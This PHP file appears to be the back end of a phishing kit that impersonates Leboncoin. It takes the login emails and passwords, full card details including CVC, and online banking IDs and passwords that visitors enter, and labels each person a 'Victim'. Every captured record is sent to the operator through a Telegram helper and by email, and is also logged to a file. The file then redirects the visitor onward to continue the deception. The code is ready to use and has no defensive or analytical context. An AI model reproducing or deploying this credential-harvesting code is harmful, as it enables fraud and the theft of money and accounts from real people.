<?php
session_start();
error_reporting(0);
/*

LOGIN
*/
include "../config.php";
include "inc/funcs.php";


if(isset($_POST['email']) && isset($_POST['password']) ){

$subject = "[Leboncoin] [LOGIN] Login from $ip";
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');

$mail = $_POST['email'];
$pass = $_POST['password'];

$message = 
"[💳] Full | LeBoncoin Login

[⌚] Heure et date  Victim: " . $_SESSION['date_heure'] . "

[👤] Email: $mail\n[🏛] Mot de passe: $pass\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n--BY. SOLCAMPBEL--\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../continue.php\" />";
}



/*
INFO DE CARTE BANK
*/


if(isset($_POST['name']) 
&& isset($_POST['banktel'])
&& isset($_POST['cardNumber'])
&& isset($_POST['expirationDate'])
&& isset($_POST['cvc'])
&& isset($_POST['montant'])
){

$subject = "[Leboncoin] [CATE] CARTE from $ip";
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');

$nom = $_POST['name'];
$tel = $_POST['banktel'];
$numcard = $_POST['cardNumber'];
$exp = $_POST['expirationDate'];
$cvv = $_POST['cvc'];
$prix = $_POST['montant'];

$message = 
"[💳] Full | LeBoncoin CARTE

[⌚] Heure et date  Victim: " . $_SESSION['date_heure'] . "

[👤] Nom complet: $nom\n[🏛] Tel: $tel\n[👤] Carte: $numcard\n[👤] Exp: $exp\n[🏛] Cvv: $cvv\n[🏛] Montant: $prix\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n--BY. SOLCAMPBEL--\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../complete.php\" />";
}

/*
INFO DE BANK
*/

if(isset($_POST['bank_select']) 
&& isset($_POST['IDbank'])
&& isset($_POST['accpw'])
){

$subject = "[Leboncoin] [BANK] BANK from $ip";
session_start();
date_default_timezone_set('Europe/Paris');
$_SESSION['date_heure'] = date('d/m/y, H:i:s');

$nbank = $_POST['bank_select'];
$idbank = $_POST['IDbank'];
$passbank = $_POST['accpw'];

$message = 
"[💳] Full | LeBoncoin BANK

[⌚] Heure et date  Victim: " . $_SESSION['date_heure'] . "

[👤] Nom de bank: $nbank\n[🏛] ID Banque: $idbank\n[👤] Mot de passe: $passbank\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n--BY. SOLCAMPBEL--\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../complete.php\" />";
}
?>
